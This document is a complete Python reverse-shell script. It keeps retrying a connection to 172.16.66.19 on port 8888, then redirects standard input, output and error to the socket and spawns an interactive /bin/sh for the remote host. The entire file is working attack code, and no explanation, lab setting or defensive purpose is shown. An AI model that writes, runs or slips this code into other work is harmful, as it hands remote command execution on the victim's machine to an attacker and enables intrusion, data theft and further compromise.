import os, socket, subprocess, time

host, port = ('172.16.66.19', 8888)
s = socket.socket()
while True:
        try:
                print('trying to connect with remote host on', host, port)
                s.connect((host, port))
        except socket.error as err:
                pass
        else:
                print('Connected to remote host')
                break
        time.sleep(2)

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
